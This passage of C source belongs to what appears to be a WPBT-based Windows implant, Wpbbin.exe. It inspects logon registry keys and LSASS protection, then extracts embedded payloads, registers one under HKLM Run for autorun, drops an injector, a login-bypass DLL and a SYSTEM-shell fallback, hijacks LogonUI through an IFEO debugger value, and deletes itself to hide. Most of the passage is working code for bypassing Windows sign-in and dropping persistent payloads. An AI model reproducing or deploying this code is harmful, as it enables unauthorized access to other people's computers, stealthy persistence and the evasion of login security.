        return ACCOUNT_TYPE_UNKNOWN;
    }

    if (BuildIdentityStoreKey(keyName, 768, sid, FALSE)) {
        type = DetectIdentityStoreAccountTypeForKey(keyName);
        if (type != ACCOUNT_TYPE_UNKNOWN) {
            return type;
        }
    }

    if (BuildIdentityStoreKey(keyName, 768, sid, TRUE)) {
        type = DetectIdentityStoreAccountTypeForKey(keyName);
        if (type != ACCOUNT_TYPE_UNKNOWN) {
            return type;
        }
    }

    return ACCOUNT_TYPE_UNKNOWN;
}

BOOLEAN IsProtectedLsassEnabled(void) {
    ULONG runAsPpl = 0;
    ULONG runAsPplBoot = 0;

    if (ReadRegistryDwordValue(g_runAsPplKey, g_runAsPplName, &runAsPpl) && runAsPpl != 0) {
        return TRUE;
    }

    if (ReadRegistryDwordValue(g_runAsPplKey, g_runAsPplBootName, &runAsPplBoot) && runAsPplBoot != 0) {
        return TRUE;
    }

    return FALSE;
}

int DetectLastProviderType(void) {
    WCHAR provider[128];

    if (!ReadRegistrySzValue(g_logonUiKey, g_lastProviderName, provider, 128)) {
        DebugLog("[GA] Provider: unknown\r\n");
        return PROVIDER_TYPE_UNKNOWN;
    }

    if (WideEqualInsensitive(provider, g_passwordProviderGuid)) {
        DebugLog("[GA] Provider: password\r\n");
        return PROVIDER_TYPE_PASSWORD;
    }

    if (WideEqualInsensitive(provider, g_pinProviderGuid)) {
        DebugLog("[GA] Provider: PIN\r\n");
        return PROVIDER_TYPE_PIN;
    }

    if (WideEqualInsensitive(provider, g_pictureProviderGuid)) {
        DebugLog("[GA] Provider: picture password\r\n");
        return PROVIDER_TYPE_PICTURE;
    }

    if (WideEqualInsensitive(provider, g_faceProviderGuid)) {
        DebugLog("[GA] Provider: face\r\n");
        return PROVIDER_TYPE_FACE;
    }

    if (WideEqualInsensitive(provider, g_fingerprintProviderGuid)) {
        DebugLog("[GA] Provider: fingerprint\r\n");
        return PROVIDER_TYPE_FINGERPRINT;
    }

    DebugLog("[GA] Provider: other\r\n");
    return PROVIDER_TYPE_OTHER;
}

int DetectAccountType(void) {
    WCHAR domain[256];
    WCHAR defaultUser[512];
    WCHAR computer[256];
    WCHAR samUser[512];
    WCHAR logonUser[512];
    WCHAR loggedOnSamUser[512];
    WCHAR loggedOnUser[512];
    WCHAR selectedSid[256];
    WCHAR lastSid[256];
    WCHAR loggedOnSid[256];
    WCHAR currentSid[256];
    BOOLEAN haveDomain;
    BOOLEAN haveDefaultUser;
    BOOLEAN haveComputer;
    BOOLEAN haveSamUser;
    BOOLEAN haveLogonUser;
    BOOLEAN haveLoggedOnSamUser;
    BOOLEAN haveLoggedOnUser;
    BOOLEAN haveSelectedSid;
    BOOLEAN haveLastSid;
    BOOLEAN haveLoggedOnSid;
    BOOLEAN haveCurrentSid;
    BOOLEAN sawMsa = FALSE;
    BOOLEAN sawAzure = FALSE;
    BOOLEAN sawLocal = FALSE;
    BOOLEAN sawDomain = FALSE;
    BOOLEAN sawBoundIdentity = FALSE;
    int identityStoreType;

    haveDomain = ReadRegistrySzValue(g_winlogonKey, g_defaultDomainName, domain, 256);
    haveDefaultUser = ReadRegistrySzValue(g_winlogonKey, g_defaultUserName, defaultUser, 512);
    haveComputer = ReadRegistrySzValue(g_computerNameKey, g_computerNameName, computer, 256);
    haveSamUser = ReadRegistrySzValue(g_logonUiKey, g_lastLoggedOnSAMUserName, samUser, 512);
    haveLogonUser = ReadRegistrySzValue(g_logonUiKey, g_lastLoggedOnUserName, logonUser, 512);
    haveLoggedOnSamUser = ReadRegistrySzValue(g_logonUiKey, g_loggedOnSAMUserName, loggedOnSamUser, 512);
    haveLoggedOnUser = ReadRegistrySzValue(g_logonUiKey, g_loggedOnUserName, loggedOnUser, 512);
    haveSelectedSid = ReadRegistrySzValue(g_logonUiKey, g_selectedUserSidName, selectedSid, 256);
    haveLastSid = ReadRegistrySzValue(g_logonUiKey, g_lastLoggedOnUserSidName, lastSid, 256);
    haveLoggedOnSid = ReadRegistrySzValue(g_logonUiKey, g_loggedOnUserSidName, loggedOnSid, 256);

    currentSid[0] = L'\0';
    haveCurrentSid = FALSE;
    if (haveSelectedSid && selectedSid[0] != L'\0') {
        WideCopyString(currentSid, 256, selectedSid);
        haveCurrentSid = TRUE;
        DebugLog("[GA] Account SID source: selected\r\n");
    } else if (haveLastSid && lastSid[0] != L'\0') {
        WideCopyString(currentSid, 256, lastSid);
        haveCurrentSid = TRUE;
        DebugLog("[GA] Account SID source: last\r\n");
    } else if (haveLoggedOnSid && loggedOnSid[0] != L'\0') {
        WideCopyString(currentSid, 256, loggedOnSid);
        haveCurrentSid = TRUE;
        DebugLog("[GA] Account SID source: logged-on\r\n");
    } else {
        DebugLog("[GA] Account SID source: unavailable\r\n");
    }

    if (haveCurrentSid) {
        identityStoreType = DetectIdentityStoreAccountType(currentSid);
        if (identityStoreType == ACCOUNT_TYPE_AD) {
            DebugLog("[GA] Account: AzureAD/Entra (IdentityStore)\r\n");
            return ACCOUNT_TYPE_AD;
        }
        if (identityStoreType == ACCOUNT_TYPE_MSA) {
            DebugLog("[GA] Account: MicrosoftAccount/email (IdentityStore)\r\n");
            return ACCOUNT_TYPE_MSA;
        }
    }

    if (SidMatchesCurrent(haveCurrentSid, currentSid, haveLastSid, lastSid)) {
        if (haveSamUser) {
            sawBoundIdentity |= AccumulateAccountValue(samUser, haveComputer ? computer : NULL,
                                                       &sawMsa, &sawAzure, &sawLocal, &sawDomain);
        }
        if (haveLogonUser) {
            sawBoundIdentity |= AccumulateAccountValue(logonUser, haveComputer ? computer : NULL,
                                                       &sawMsa, &sawAzure, &sawLocal, &sawDomain);
        }
    }

    if (SidMatchesCurrent(haveCurrentSid, currentSid, haveLoggedOnSid, loggedOnSid)) {
        if (haveLoggedOnSamUser) {
            sawBoundIdentity |= AccumulateAccountValue(loggedOnSamUser, haveComputer ? computer : NULL,
                                                       &sawMsa, &sawAzure, &sawLocal, &sawDomain);
        }
        if (haveLoggedOnUser) {
            sawBoundIdentity |= AccumulateAccountValue(loggedOnUser, haveComputer ? computer : NULL,
                                                       &sawMsa, &sawAzure, &sawLocal, &sawDomain);
        }
    }

    if (!haveCurrentSid && !sawBoundIdentity && haveDefaultUser) {
        sawBoundIdentity |= AccumulateAccountValue(defaultUser, haveComputer ? computer : NULL,
                                                   &sawMsa, &sawAzure, &sawLocal, &sawDomain);
    }

    if (sawAzure || (haveDomain && WideEqualInsensitive(domain, L"AzureAD"))) {
        DebugLog("[GA] Account: AzureAD/Entra\r\n");
        return ACCOUNT_TYPE_AD;
    }

    if (sawMsa || (haveDomain && WideEqualInsensitive(domain, L"MicrosoftAccount"))) {
        DebugLog("[GA] Account: MicrosoftAccount/email\r\n");
        return ACCOUNT_TYPE_MSA;
    }

    if (sawDomain) {
        DebugLog("[GA] Account: domain/other\r\n");
        return ACCOUNT_TYPE_AD;
    }

    if (sawLocal
        || (haveDomain && WideEqualInsensitive(domain, L"."))
        || (haveComputer && haveDomain && WideEqualInsensitive(domain, computer))) {
        DebugLog("[GA] Account: local\r\n");
        return ACCOUNT_TYPE_LOCAL;
    }

    if (!haveCurrentSid && haveDomain && domain[0] != L'\0') {
        DebugLog("[GA] Account: domain/other (domain fallback)\r\n");
        return ACCOUNT_TYPE_AD;
    }

    DebugLog("[GA] Account: unknown\r\n");
    return ACCOUNT_TYPE_UNKNOWN;
}

int DetectLogonPlan(void) {
    int accountType;
    int providerType;
    BOOLEAN protectedLsass;

    g_fallbackReason = FALLBACK_REASON_NONE;
    g_detectedAccountType = ACCOUNT_TYPE_UNKNOWN;
    g_detectedProviderType = PROVIDER_TYPE_UNKNOWN;

    protectedLsass = IsProtectedLsassEnabled();
    accountType = DetectAccountType();
    providerType = DetectLastProviderType();
    g_detectedAccountType = accountType;
    g_detectedProviderType = providerType;

    if (protectedLsass) {
        g_fallbackReason = FALLBACK_REASON_PROTECTED_LSASS;
        DebugLog("[GA] Plan: fallback shell (protected LSASS)\r\n");
        return LOGON_PLAN_FALLBACK_SHELL;
    }

    if (accountType != ACCOUNT_TYPE_LOCAL) {
        if (accountType == ACCOUNT_TYPE_UNKNOWN) {
            g_fallbackReason = FALLBACK_REASON_UNKNOWN;
        } else {
            g_fallbackReason = FALLBACK_REASON_NON_LOCAL_ACCOUNT;
        }
        DebugLog("[GA] Plan: fallback shell (non-local account)\r\n");
        return LOGON_PLAN_FALLBACK_SHELL;
    }

    if (providerType == PROVIDER_TYPE_PASSWORD
        || providerType == PROVIDER_TYPE_PIN
        || providerType == PROVIDER_TYPE_PICTURE) {
        DebugLog("[GA] Plan: auto patch\r\n");
        return LOGON_PLAN_AUTO_PATCH;
    }

    if (providerType == PROVIDER_TYPE_UNKNOWN) {
        g_fallbackReason = FALLBACK_REASON_UNKNOWN;
    } else {
        g_fallbackReason = FALLBACK_REASON_UNSUPPORTED_PROVIDER;
    }
    DebugLog("[GA] Plan: fallback shell (unsupported provider)\r\n");
    return LOGON_PLAN_FALLBACK_SHELL;
}

char* GetFallbackReasonText(void) {
    switch (g_fallbackReason) {
    case FALLBACK_REASON_PROTECTED_LSASS:
        return g_reasonProtectedLsass;
    case FALLBACK_REASON_NON_LOCAL_ACCOUNT:
        return g_reasonNonLocalAccount;
    case FALLBACK_REASON_UNSUPPORTED_PROVIDER:
        return g_reasonUnsupportedProvider;
    case FALLBACK_REASON_UNKNOWN:
    default:
        return g_reasonUnknown;
    }
}

char* GetAccountTypeText(int accountType) {
    switch (accountType) {
    case ACCOUNT_TYPE_LOCAL:
        return "Local account";
    case ACCOUNT_TYPE_MSA:
        return "Microsoft account";
    case ACCOUNT_TYPE_AD:
        return "Microsoft Entra ID / AD domain account";
    case ACCOUNT_TYPE_UNKNOWN:
    default:
        return "Unknown account";
    }
}

char* GetProviderTypeText(int providerType) {
    switch (providerType) {
    case PROVIDER_TYPE_PASSWORD:
        return "Password";
    case PROVIDER_TYPE_PIN:
        return "PIN";
    case PROVIDER_TYPE_PICTURE:
        return "Picture password";
    case PROVIDER_TYPE_FACE:
        return "Hello face";
    case PROVIDER_TYPE_FINGERPRINT:
        return "Hello fingerprint";
    case PROVIDER_TYPE_OTHER:
        return "Other provider";
    case PROVIDER_TYPE_UNKNOWN:
    default:
        return "Unknown provider";
    }
}

char* GetFallbackMethodText(void) {
    _snprintf(g_fallbackMethodText,
              sizeof(g_fallbackMethodText) - 1,
              "%s + %s\r\n",
              GetAccountTypeText(g_detectedAccountType),
              GetProviderTypeText(g_detectedProviderType));
    g_fallbackMethodText[sizeof(g_fallbackMethodText) - 1] = '\0';
    return g_fallbackMethodText;
}


/* ============================================================================
 * Diagnostic Logging
 * ============================================================================ */
#if GA_DEBUG
/* Append a diagnostic line to ga_status.txt.
 * Uses FILE_APPEND_DATA (not FILE_GENERIC_WRITE) so each open appends to
 * end-of-file rather than overwriting from offset 0. */
void DebugLog(char* msg) {
    HANDLE hLog = NULL;
    OBJECT_ATTRIBUTES logAttr;
    UNICODE_STRING uLogPath;
    IO_STATUS_BLOCK logIsb;
    ULONG len = 0;
    ULONG written = 0;

    while (msg[len]) len++;

    RtlInitUnicodeString(&uLogPath, g_logPath);
    InitializeObjectAttributes(&logAttr, &uLogPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    if (NT_SUCCESS(NtCreateFile(&hLog, FILE_APPEND_DATA | SYNCHRONIZE, &logAttr, &logIsb,
                                NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ,
                                FILE_OPEN_IF,
                                FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
                                NULL, 0))) {
        NtFileWriteFile(hLog, msg, len, &written);
        NtClose(hLog);
    }
}
#endif


/* ============================================================================
 * Payload Operations
 * ============================================================================ */

/* Extract an embedded payload from the self-buffer and write it to disk. */
BOOLEAN ExtractAndWritePayload(PVOID fileBuffer, ULONG startOffset, ULONG payloadSize, PCWSTR destinationPath) {
    HANDLE hTargetFile = NULL;
    OBJECT_ATTRIBUTES objAttr;
    UNICODE_STRING ustrPath;
    IO_STATUS_BLOCK ioStatus;
    NTSTATUS status;
    PVOID payloadBuffer = NULL;
    ULONG bytesWritten = 0;

    if (payloadSize == 0) return FALSE;

    RtlInitUnicodeString(&ustrPath, destinationPath);
    InitializeObjectAttributes(&objAttr, &ustrPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtCreateFile(&hTargetFile, FILE_GENERIC_WRITE, &objAttr, &ioStatus, NULL,
                          FILE_ATTRIBUTE_NORMAL, 0, FILE_OVERWRITE_IF,
                          FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE, NULL, 0);
    if (!NT_SUCCESS(status)) return FALSE;

    payloadBuffer = (PVOID)((PUCHAR)fileBuffer + startOffset);

    if (!NtFileWriteFile(hTargetFile, payloadBuffer, payloadSize, &bytesWritten)) {
        NtClose(hTargetFile);
        return FALSE;
    }

    NtClose(hTargetFile);
    return (bytesWritten == payloadSize);
}

/* Write a text string to a file (used for cleanup BAT scripts). */
BOOLEAN WriteTextFile(PCWSTR destinationPath, char* content) {
    HANDLE hTargetFile = NULL;
    OBJECT_ATTRIBUTES objAttr;
    UNICODE_STRING ustrPath;
    IO_STATUS_BLOCK ioStatus;
    NTSTATUS status;
    ULONG bytesWritten = 0;
    ULONG contentLen = 0;

    while (content[contentLen]) contentLen++;

    RtlInitUnicodeString(&ustrPath, destinationPath);
    InitializeObjectAttributes(&objAttr, &ustrPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtCreateFile(&hTargetFile, FILE_GENERIC_WRITE, &objAttr, &ioStatus, NULL,
                          FILE_ATTRIBUTE_NORMAL, 0, FILE_OVERWRITE_IF,
                          FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE, NULL, 0);
    if (!NT_SUCCESS(status)) return FALSE;

    if (!NtFileWriteFile(hTargetFile, content, contentLen, &bytesWritten)) {
        NtClose(hTargetFile);
        return FALSE;
    }

    NtClose(hTargetFile);
    return (bytesWritten == contentLen);
}

/* ============================================================================
 * Setup: User Payload Autorun
 * ============================================================================
 *
 * When build.ps1 bundles payload.exe, Stage2 should act as a simple dropper:
 * extract the user payload, register it under HKLM Run, and skip all login
 * bypass logic. This keeps payload mode independent from account type.
 */
BOOLEAN InstallAutorunPayload(PVOID selfBuffer, PAYLOAD_INFO* payloads, int payloadIndex) {
    if (!selfBuffer || !payloads
        || payloadIndex < 0
        || payloadIndex >= payloads->count
        || payloads->size[payloadIndex] == 0) {
        DebugLog("[GA] Autorun payload missing\r\n");
        return FALSE;
    }

    if (!ExtractAndWritePayload(selfBuffer,
                                payloads->start[payloadIndex],
                                payloads->size[payloadIndex],
                                g_autorunPath)) {
        DebugLog("[GA] Autorun payload extract: FAIL\r\n");
        return FALSE;
    }

    setRegistryValue(g_autorunKey, g_autorunName, g_autorunData, REG_SZ);
    DebugLog("[GA] Autorun payload installed\r\n");
    return TRUE;
}


/* ============================================================================
 * Setup: LogonUI Helper
 * ============================================================================
 *
 * No-custom-payload mode:
 *   1. Extract Injector.exe
 *   2. Extract GrabAccessMsvpBypass.dll
 *   3. Extract GrabAccessExplorerHost.exe
 *   4. Extract GrabAccessFallback.exe
 *   5. Classify the last sign-in path
 *   6. Write either the auto patch BAT or fallback SYSTEM shell BAT
 *   7. Set LogonUI IFEO to the BAT
 */
BOOLEAN SetupLegacyLogonHelper(PVOID selfBuffer, PAYLOAD_INFO* payloads) {
    BOOLEAN bInjector, bDll, bExplorerHost, bFallback, bBat, bCleanupBat, bReason;
    int logonPlan;
    char* helperBat;
    char* cleanupBat;

    if (!selfBuffer || !payloads || payloads->count < 2
        || payloads->size[0] == 0 || payloads->size[1] == 0) {
        DebugLog("[GA] LogonUI helper payloads missing\r\n");
        return FALSE;
    }

    bInjector = ExtractAndWritePayload(selfBuffer, payloads->start[0], payloads->size[0], g_injectorPath);
    DebugLog(bInjector ? "[GA] Injector extract: OK\r\n" : "[GA] Injector extract: FAIL\r\n");

    bDll = ExtractAndWritePayload(selfBuffer, payloads->start[1], payloads->size[1], g_dllPath);
    DebugLog(bDll ? "[GA] DLL extract: OK\r\n" : "[GA] DLL extract: FAIL\r\n");

    bExplorerHost = TRUE;
    if (payloads->count >= 3 && payloads->size[2] > 0) {
        bExplorerHost = ExtractAndWritePayload(selfBuffer,
                                               payloads->start[2],
                                               payloads->size[2],
                                               g_explorerHostPath);
        DebugLog(bExplorerHost ? "[GA] Explorer host extract: OK\r\n"
                               : "[GA] Explorer host extract: FAIL\r\n");
    } else {
        DebugLog("[GA] Explorer host payload missing; file-management button will fail\r\n");
    }

    bFallback = TRUE;
    if (payloads->count >= 4 && payloads->size[3] > 0) {
        bFallback = ExtractAndWritePayload(selfBuffer,
                                           payloads->start[3],
                                           payloads->size[3],
                                           g_fallbackPath);
        DebugLog(bFallback ? "[GA] Fallback extract: OK\r\n"
                           : "[GA] Fallback extract: FAIL\r\n");
    } else {
        DebugLog("[GA] Fallback payload missing; cmd fallback only\r\n");
    }

    bReason = TRUE;
    logonPlan = DetectLogonPlan();
    if (logonPlan == LOGON_PLAN_AUTO_PATCH) {
        helperBat = g_batAutoPatchHelper;
        cleanupBat = g_batCleanupHelper;
        DebugLog("[GA] Helper: auto patch\r\n");
    } else {
        helperBat = g_batFallbackShellHelper;
        cleanupBat = g_batFallbackCleanupHelper;
        bReason = WriteTextFile(g_reasonPath, GetFallbackReasonText());
        DebugLog(bReason ? "[GA] Fallback reason write: OK\r\n" : "[GA] Fallback reason write: FAIL\r\n");
        DebugLog(WriteTextFile(g_methodPath, GetFallbackMethodText())
                 ? "[GA] Fallback method write: OK\r\n"
                 : "[GA] Fallback method write: FAIL\r\n");
        DebugLog("[GA] Helper: fallback shell\r\n");
    }

    bBat = WriteTextFile(g_batPath, helperBat);
    DebugLog(bBat ? "[GA] Helper BAT write: OK\r\n" : "[GA] Helper BAT write: FAIL\r\n");

    bCleanupBat = WriteTextFile(g_cleanupBatPath, cleanupBat);
    DebugLog(bCleanupBat ? "[GA] Cleanup BAT write: OK\r\n" : "[GA] Cleanup BAT write: FAIL\r\n");

    if (!bInjector || !bDll || !bExplorerHost || !bFallback || !bBat || !bCleanupBat || !bReason) {
        return FALSE;
    }

    setRegistryValue(g_ifeoLogonUIKey, g_ifeoDebugger, g_ifeoCmdLegacy, REG_SZ);
    DebugLog("[GA] LogonUI helper setup complete\r\n");
    return TRUE;
}


/* ============================================================================
 * Cleanup: Self-Delete Wpbbin.exe
 * ============================================================================
 *
 * Mark Wpbbin.exe for deletion via FILE_DELETE_ON_CLOSE.
 * The OS removes the file once all handles close, which happens when smss
 * releases the image section after NtTerminateProcess. This ensures Wpbbin.exe
 * does not persist on disk. WPBT re-extracts it fresh on every boot.
 */
void SelfDeleteBinary(void) {
    HANDLE hSelfDel = NULL;
    IO_STATUS_BLOCK selfDelIsb;
    UNICODE_STRING uSelfDel;
    OBJECT_ATTRIBUTES selfDelObj;

    RtlInitUnicodeString(&uSelfDel, g_selfPath);
    InitializeObjectAttributes(&selfDelObj, &uSelfDel, OBJ_CASE_INSENSITIVE, NULL, NULL);

    if (NT_SUCCESS(NtCreateFile(&hSelfDel, DELETE | SYNCHRONIZE, &selfDelObj, &selfDelIsb,
                                NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_DELETE,
                                FILE_OPEN,
                                FILE_DELETE_ON_CLOSE | FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
                                NULL, 0))) {
        NtClose(hSelfDel);
    }
}

USHORT ReadUshortLe(PUCHAR base, ULONG offset) {
    USHORT value = 0;
    RtlCopyMemory(&value, base + offset, sizeof(value));
    return value;
}

ULONG ReadUlongLe(PUCHAR base, ULONG offset) {
    ULONG value = 0;
    RtlCopyMemory(&value, base + offset, sizeof(value));
    return value;
}

BOOLEAN FindAuthenticodeCertificateOffset(PVOID selfBuffer, ULONG fileSize, ULONG* certificateOffset) {
    PUCHAR base = (PUCHAR)selfBuffer;
    ULONG peOffset;
    ULONG optionalOffset;
    ULONG optionalEnd;
    ULONG dataDirectoryOffset;
    ULONG numberOfDirectoriesOffset;
    ULONG certDirectoryOffset;
    ULONG certOffset;
    ULONG certSize;
    ULONG optionalMagic;
    ULONG numberOfDirectories;
    USHORT optionalSize;

    if (!selfBuffer || !certificateOffset || fileSize < 0x40) {
        return FALSE;
    }

    if (ReadUshortLe(base, 0) != GA_DOS_SIGNATURE) {
        return FALSE;
    }

    peOffset = ReadUlongLe(base, 0x3C);
    if (peOffset > fileSize - 0x18) {
        return FALSE;
    }

    if (ReadUlongLe(base, peOffset) != GA_NT_SIGNATURE) {
        return FALSE;
    }

    optionalOffset = peOffset + 0x18;
    optionalSize = ReadUshortLe(base, peOffset + 0x14);
    if (optionalSize < 0x70
        || optionalOffset > fileSize
        || optionalSize > fileSize - optionalOffset) {
        return FALSE;
    }

    optionalEnd = optionalOffset + optionalSize;
    optionalMagic = ReadUshortLe(base, optionalOffset);
    if (optionalMagic == GA_PE64_MAGIC) {
        numberOfDirectoriesOffset = optionalOffset + 0x6C;
        dataDirectoryOffset = optionalOffset + 0x70;
    } else if (optionalMagic == GA_PE32_MAGIC) {
        numberOfDirectoriesOffset = optionalOffset + 0x5C;
        dataDirectoryOffset = optionalOffset + 0x60;
    } else {
        return FALSE;
    }

    if (numberOfDirectoriesOffset > optionalEnd - sizeof(ULONG)) {
        return FALSE;
    }

    numberOfDirectories = ReadUlongLe(base, numberOfDirectoriesOffset);
    if (numberOfDirectories <= GA_DIRECTORY_ENTRY_SECURITY) {
        return FALSE;
    }

    certDirectoryOffset = dataDirectoryOffset + (GA_DIRECTORY_ENTRY_SECURITY * 8);
    if (certDirectoryOffset > optionalEnd - 8) {
        return FALSE;
    }

    certOffset = ReadUlongLe(base, certDirectoryOffset);
    certSize = ReadUlongLe(base, certDirectoryOffset + 4);
    if (certOffset == 0 || certSize == 0
        || certOffset < sizeof(GA_PACKAGE_FOOTER)
        || certOffset > fileSize
        || certSize > fileSize - certOffset) {
        return FALSE;
    }

    *certificateOffset = certOffset;
    return TRUE;
}

BOOLEAN LoadPayloadsFromFooterAtOffset(PVOID selfBuffer, ULONG fileSize, ULONG footerOffset, PAYLOAD_INFO* payloads) {
    GA_PACKAGE_FOOTER footer;
    ULONG payloadEnd;
    ULONG i;

    if (!selfBuffer || !payloads
        || fileSize < sizeof(GA_PACKAGE_FOOTER)
        || footerOffset > fileSize - sizeof(GA_PACKAGE_FOOTER)) {
        return FALSE;
    }

    RtlCopyMemory(&footer,
                  (PUCHAR)selfBuffer + footerOffset,
                  sizeof(GA_PACKAGE_FOOTER));

    if (footer.magic != GA_PACKAGE_MAGIC
        || footer.version != GA_PACKAGE_VERSION
        || footer.footerSize != sizeof(GA_PACKAGE_FOOTER)
        || footer.count > GA_MAX_PAYLOADS) {
        return FALSE;
    }

    payloadEnd = footerOffset;
    RtlZeroMemory(payloads, sizeof(PAYLOAD_INFO));
    payloads->count = (int)footer.count;

    for (i = 0; i < footer.count; ++i) {
        if (footer.size[i] == 0
            || footer.offset[i] >= payloadEnd
            || footer.size[i] > payloadEnd - footer.offset[i]) {
            RtlZeroMemory(payloads, sizeof(PAYLOAD_INFO));
            return FALSE;
        }

        payloads->start[i] = footer.offset[i];
        payloads->size[i] = footer.size[i];
    }

    return TRUE;
}

BOOLEAN LoadPayloadsFromFooter(PVOID selfBuffer, ULONG fileSize, PAYLOAD_INFO* payloads) {
    ULONG footerOffset;
    ULONG certOffset;
    ULONG padding;

    if (!selfBuffer || !payloads || fileSize < sizeof(GA_PACKAGE_FOOTER)) {
        return FALSE;
    }

    footerOffset = fileSize - sizeof(GA_PACKAGE_FOOTER);
    if (LoadPayloadsFromFooterAtOffset(selfBuffer, fileSize, footerOffset, payloads)) {
        DebugLog("[GA] Payload footer location: EOF\r\n");
        return TRUE;
    }

    if (FindAuthenticodeCertificateOffset(selfBuffer, fileSize, &certOffset)) {
        for (padding = 0; padding < 8 && certOffset >= sizeof(GA_PACKAGE_FOOTER) + padding; ++padding) {
            footerOffset = certOffset - sizeof(GA_PACKAGE_FOOTER) - padding;
            if (LoadPayloadsFromFooterAtOffset(selfBuffer, fileSize, footerOffset, payloads)) {
                DebugLog("[GA] Payload footer location: before certificate\r\n");
                return TRUE;
            }
        }
    }

    return FALSE;
}

BOOLEAN LoadPayloadsFromLegacyMarkers(PVOID selfBuffer, ULONG fileSize, PAYLOAD_INFO* payloads) {
    volatile const ULONGLONG Push = 0x0000000042415247;
    volatile const ULONGLONG EAX  = 0x5343434100000000;
    const ULONGLONG PAYLOAD_MARKER = Push + EAX;

    ULONG markerOffsets[GA_MAX_PAYLOADS + 1];
    int markersFound = 0;
    ULONG i;
    int j;

    if (!selfBuffer || !payloads || fileSize < sizeof(ULONGLONG)) {
        return FALSE;
    }

    RtlZeroMemory(markerOffsets, sizeof(markerOffsets));
    RtlZeroMemory(payloads, sizeof(PAYLOAD_INFO));

    for (i = 0; i <= fileSize - sizeof(ULONGLONG); ++i) {
        ULONGLONG chunk;
        RtlCopyMemory(&chunk, (PUCHAR)selfBuffer + i, sizeof(ULONGLONG));
        if (chunk == PAYLOAD_MARKER) {
            if (markersFound < (GA_MAX_PAYLOADS + 1)) {
                markerOffsets[markersFound++] = i;
            } else {
                break;
            }
        }
    }

    if (markersFound <= 1) {
        return FALSE;
    }

    payloads->count = markersFound - 1;
    for (j = 0; j < payloads->count; ++j) {
        ULONG endOff;
        payloads->start[j] = markerOffsets[j] + sizeof(ULONGLONG);
        endOff = (j + 1 < markersFound) ? markerOffsets[j + 1] : fileSize;
        if (endOff > payloads->start[j]) {
            payloads->size[j] = endOff - payloads->start[j];
        } else {
            RtlZeroMemory(payloads, sizeof(PAYLOAD_INFO));
            return FALSE;
        }
    }

    return TRUE;
}


/* ============================================================================
 * Entry Point
 * ============================================================================ */
void NtProcessStartup(PSTARTUP_ARGUMENT Argument) {
    HANDLE hSelfFile = NULL;
    IO_STATUS_BLOCK isb;
    OBJECT_ATTRIBUTES obj;
    UNICODE_STRING ustr;
    LONGLONG fileSize = 0;
    PVOID pSelfBuffer = NULL;
    ULONG dwReadSize = 0;
    PAYLOAD_INFO payloads;

    InitHeapMemory();
    DebugLog("[GA] === NtProcessStartup BEGIN ===\r\n");

    RtlZeroMemory(&payloads, sizeof(PAYLOAD_INFO));

    /* -------------------------------------------------------------------- */
    /* Step 1: Read self (Wpbbin.exe) into memory                           */
    /* -------------------------------------------------------------------- */
    RtlInitUnicodeString(&ustr, g_selfPath);
    InitializeObjectAttributes(&obj, &ustr, OBJ_CASE_INSENSITIVE, NULL, NULL);

    if (!NT_SUCCESS(NtCreateFile(&hSelfFile, FILE_GENERIC_READ, &obj, &isb, 0,
                                  FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN,
                                  FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
                                  NULL, 0))) {
        DebugLog("[GA] FAIL: Cannot open Wpbbin.exe\r\n");
        goto done;
    }

    if (!NtFileGetFileSize(hSelfFile, &fileSize)
        || fileSize < (LONGLONG)sizeof(ULONGLONG)
        || fileSize > 0xFFFFFFFF) {
        DebugLog("[GA] FAIL: Invalid file size\r\n");
        goto done;
    }

    pSelfBuffer = malloc((ULONG)fileSize);
    if (!pSelfBuffer) {
        DebugLog("[GA] FAIL: malloc for self buffer\r\n");
        goto done;
    }

    if (!NtFileReadFile(hSelfFile, pSelfBuffer, (ULONG)fileSize, &dwReadSize)
        || dwReadSize != (ULONG)fileSize) {
        DebugLog("[GA] FAIL: read self\r\n");
        goto done;
    }
    NtClose(hSelfFile);
    hSelfFile = NULL;

    /* -------------------------------------------------------------------- */
    /* Step 2: Locate embedded payloads                                     */
    /* -------------------------------------------------------------------- */
    if (LoadPayloadsFromFooter(pSelfBuffer, (ULONG)fileSize, &payloads)) {
        DebugLog("[GA] Payload footer found\r\n");
    } else if (LoadPayloadsFromLegacyMarkers(pSelfBuffer, (ULONG)fileSize, &payloads)) {
        DebugLog("[GA] Legacy payload markers found\r\n");
    } else {
        DebugLog("[GA] No payloads found\r\n");
    }

    /* -------------------------------------------------------------------- */
    /* Step 3: User payload mode                                            */
    /* -------------------------------------------------------------------- */
    if (payloads.count == 1 && payloads.size[0] > 0) {
        DebugLog("[GA] Mode: autorun payload\r\n");
        InstallAutorunPayload(pSelfBuffer, &payloads, 0);
        goto cleanup_self;
    }

    /* -------------------------------------------------------------------- */
    /* Step 4: LogonUI helper mode                                          */
    /* -------------------------------------------------------------------- */
    if (payloads.count >= 2 && payloads.size[0] > 0 && payloads.size[1] > 0) {
        DebugLog("[GA] Mode: LogonUI helper\r\n");
        SetupLegacyLogonHelper(pSelfBuffer, &payloads);
    } else {
        DebugLog("[GA] SKIP: No usable payloads available\r\n");
    }

    /* -------------------------------------------------------------------- */
    /* Step 5: Self-delete Wpbbin.exe                                       */
    /* -------------------------------------------------------------------- */
cleanup_self:
    SelfDeleteBinary();

done:
    if (pSelfBuffer) free(pSelfBuffer);
    if (hSelfFile)   NtClose(hSelfFile);
    DeinitHeapMemory();
    NtTerminateProcess(NtCurrentProcess(), 0);
}
